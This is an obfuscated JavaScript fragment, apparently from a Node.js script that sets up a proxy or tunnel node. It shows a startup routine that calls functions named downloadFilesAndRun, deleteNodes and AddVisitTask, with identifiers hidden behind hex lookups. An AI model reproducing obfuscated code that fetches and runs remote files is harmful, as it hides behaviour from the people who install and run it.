startserver(){const _0x43abb0=_0x75d768;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4dc08c){console['error'](_0x43abb0(0x224),_0x4dc08c);}}startserver()[_0x75d768(0x250)](_0x25f7ee=>{const _0x1c5b59=_0x75d768;console[_0x1c5b59(0x22b)](_0x1c5b59(0x2a4),_0x25f7ee);}),app[_0x75d768(0x210)](PORT,()=>console[_0x75d768(0x22d)](_0x75d768(0x265)+PORT+'!'));
